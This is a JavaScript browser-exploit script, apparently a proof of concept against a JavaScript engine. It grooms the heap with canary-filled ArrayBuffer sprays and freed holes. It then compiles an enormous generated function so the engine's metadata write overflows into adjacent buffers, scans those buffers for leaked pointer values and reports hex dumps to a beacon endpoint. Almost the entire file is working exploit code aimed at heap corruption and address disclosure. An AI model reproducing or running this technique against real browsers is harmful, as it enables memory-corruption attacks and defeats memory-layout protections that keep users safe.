// p150c — Compilation-only: DON'T call the function
// INSIGHT: finishCreation() writes ALL 38M metadata entries (4.29GB sweep).
//   COMPILED-OK proves the write completed without crash.
//   The CALL crashes because LLInt reads OOB metadata (garbage pointers).
//   Solution: skip the call entirely. Read spray ABs after compilation.
//   If finishCreation wrote through our ABs, we see metadata entry bytes = POINTERS.
// Beacon prefix: V150-

(function() {
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V150-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch (e) {}
  }
  function BP(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V150-' + tag + '?t=' + Date.now(), true);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body);
    } catch (e) {
      B(tag + '-POSTFAIL');
    }
  }

  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  var BUF_SZ = 100096;

  // ---- PHASE 1: Massive spray — saturate marge's 100K size class ----
  // More spray = higher chance metadata buffer lands adjacent to one
  var SPRAY_N = 80;
  var sprays = [];
  var sprayViews = [];
  for (var i = 0; i < SPRAY_N; i++) {
    var ab = new ArrayBuffer(BUF_SZ);
    var v = new Uint8Array(ab);
    // Fill with unique canary per AB: 0xC0 | (i & 0x3F) repeating
    var canary = 0xC0 | (i & 0x3F);
    for (var j = 0; j < BUF_SZ; j++) v[j] = canary;
    sprays.push(ab);
    sprayViews.push(v);
  }
  B('SPRAY-' + SPRAY_N);

  // ---- PHASE 2: Free EVERY OTHER to create holes ----
  var freed = [];
  for (var i = 0; i < SPRAY_N; i += 2) {
    freed.push(i);
    sprays[i] = null;
    sprayViews[i] = null;
  }
  B('HOLES-' + freed.length);

  // GC pressure
  var gcR = 0;
  function gcP() {
    try {
      for (var g = 0; g < 300; g++) { var t = new ArrayBuffer(8192); t = null; }
    } catch (e) {}
    gcR++;
    if (gcR < 25) { setTimeout(gcP, 30); }
    else { B('GC-DONE'); phaseBuild(); }
  }
  gcP();

  // ---- PHASE 3: Build + compile (NO CALL) ----
  function phaseBuild() {
    var N = 38348816;
    B('BUILD');

    var CHUNK = 4000000;
    var chunksN = Math.floor(N / CHUNK);
    var rem = N - chunksN * CHUNK;

    var callChunk = 'a();'.repeat(CHUNK);
    var parts = new Array(chunksN + 3);
    parts[0] = 'window.__p150fn=function(a){';
    for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
    parts[chunksN + 1] = 'a();'.repeat(rem);
    parts[chunksN + 2] = '};window.__p150ok=1;';
    callChunk = null;

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onerror = function() { B('SCRIPT-ERR'); };
    sc.onload = function() {
      var ok = window.__p150ok ? 'OK' : 'FAIL';
      B('COMPILED-' + ok);
      if (ok === 'OK') {
        // DO NOT CALL THE FUNCTION
        // finishCreation already wrote 4.29GB of metadata entries
        // Read spray ABs NOW for corruption
        setTimeout(phaseRead, 100);
      }
    };
    document.head.appendChild(sc);
    sc.src = url;
  }

  // ---- PHASE 4: Scan ALL surviving spray ABs for changes ----
  function phaseRead() {
    B('READ-START');

    var hitCount = 0;
    var totalChanged = 0;

    for (var i = 0; i < SPRAY_N; i++) {
      if (!sprayViews[i]) continue; // freed slot

      var view = sprayViews[i];
      var canary = 0xC0 | (i & 0x3F);
      var changed = 0;
      var firstOff = -1;

      // Scan every byte for changes from canary
      for (var j = 0; j < view.length; j++) {
        if (view[j] !== canary) {
          if (firstOff === -1) firstOff = j;
          changed++;
        }
      }

      if (changed > 0) {
        hitCount++;
        totalChanged += changed;
        B('HIT-' + i + '-c=' + changed + '-f=' + firstOff);

        // Dump first 3 entry-aligned 112-byte blocks that changed
        var entryStart = Math.floor(firstOff / 112) * 112;
        var dumped = 0;
        for (var e = entryStart; e < view.length && dumped < 3; e += 112) {
          var hasChange = false;
          for (var c = e; c < Math.min(e + 112, view.length); c++) {
            if (view[c] !== canary) { hasChange = true; break; }
          }
          if (!hasChange) continue;
          dumped++;

          // Full 112-byte entry as hex (2 beacons)
          var h1 = '', h2 = '';
          for (var b = e; b < Math.min(e + 56, view.length); b++) h1 += hexByte(view[b]);
          for (var b2 = e + 56; b2 < Math.min(e + 112, view.length); b2++) h2 += hexByte(view[b2]);
          B('E' + i + '@' + e + 'a-' + h1);
          B('E' + i + '@' + e + 'b-' + h2);

          // Extract 8-byte values at every 8-byte offset (potential pointers)
          var ptrs = '';
          for (var p = 0; p < 112 && (e + p + 7) < view.length; p += 8) {
            var nonCanary = false;
            for (var v2 = 0; v2 < 8; v2++) {
              if (view[e + p + v2] !== canary) { nonCanary = true; break; }
            }
            if (nonCanary) {
              var hex8 = '';
              for (var h = 7; h >= 0; h--) hex8 += hexByte(view[e + p + h]);
              ptrs += p + ':' + hex8 + ' ';
            }
          }
          if (ptrs) BP('P' + i + '@' + e, ptrs.trim());
        }

        // Count how many full 112-byte entries were overwritten
        var fullEntries = 0;
        for (var e2 = 0; e2 + 112 <= view.length; e2 += 112) {
          var allChanged = true;
          for (var c2 = e2; c2 < e2 + 112; c2++) {
            if (view[c2] === canary) { allChanged = false; break; }
          }
          if (allChanged) fullEntries++;
        }
        if (fullEntries > 0) B('FULL-' + i + '-' + fullEntries);
      }
    }

    B('DONE-hits=' + hitCount + '-bytes=' + totalChanged);

    // Also check: can we read the function's metadata buffer directly?
    // Try accessing properties that might expose internals
    if (window.__p150fn) {
      try {
        var fnStr = window.__p150fn.toString().length;
        B('FN-TOSTR-' + fnStr);
      } catch (e) {
        B('FN-TOSTR-ERR');
      }
    }
  }
})();
